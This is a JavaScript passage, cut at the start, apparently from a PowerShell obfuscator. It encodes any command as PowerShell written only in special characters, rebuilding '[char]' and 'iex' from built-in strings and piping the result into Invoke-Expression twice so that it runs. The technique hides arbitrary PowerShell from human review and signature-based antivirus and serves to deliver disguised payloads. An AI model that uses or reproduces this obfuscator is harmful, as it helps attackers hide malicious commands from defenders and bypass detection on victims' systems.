    let return_string = ""
    for(i=0;i<chars.length;i++){
        if(chars[i] == "0"){
            return_string+= zero+'+'
        }
        if(chars[i] == "1"){
            return_string+= one+'+'
        }
        if(chars[i] == "2"){
            return_string+= two+'+'
        }
        if(chars[i] == "3"){
            return_string+= three+'+'
        }
        if(chars[i] == "4"){
            return_string+= four+'+'
        }
        if(chars[i] == "5"){
            return_string+= five+'+'
        }

        if(chars[i] == "6"){
            return_string+= six+'+'
        }
        if(chars[i] == "7"){
            return_string+= seven+'+'
        }
        if(chars[i] == "8"){
            return_string+= eight+'+'
        }
        if(chars[i] == "9"){
            return_string+= nine+'+'
        }
    }
    return_string = return_string.slice(0, -1);

    return "${\"}+"+return_string.replace("\"\"","\"+\"")
}
const custom_encode = (str)=>{
    let init = "${;}=+$()"
    init +=";${=}=${;}"
    init +=";${+}=++${;}"
    init +=";${@}=++${;}"
    init +=";${.}=++${;}"
    init +=";${[}=++${;}"
    init +=";${]}=++${;}"
    init +=";${(}=++${;}"
    init +=";${)}=++${;}"
    init +=";${&}=++${;}"
    init +=";${|}=++${;}"
    init +=";"
    init +='${"}="["+"$(@{})"[${)}]+"$(@{})"["${+}${|}"]+"$(@{})"["${@}${=}"]+"$?"[${+}]+"]"'
    init +=';'
    init +='${;}="".("$(@{})"["${+}${[}"]+"$(@{})"["${+}${(}"]+"$(@{})"[${=}]+"$(@{})"[${[}]+"$?"[${+}]+"$(@{})"[${.}])'
    init +=';'
    init +='${;}="$(@{})"["${+}${[}"]+"$(@{})"[${[}]+"${;}"["${@}${)}"]'
    init+=";"
    const iex = "&${;}"
let return_string = ""
for(let i = 0; i < str.length; i++) {
    let asciiCode = str.charCodeAt(i);
    return_string +=Ascii_char_handle(asciiCode) + "+\"+\"+"
    
}
return_string = return_string.slice(0, -5);

return init+return_string + ` | ${iex}` + `| ${iex}`
}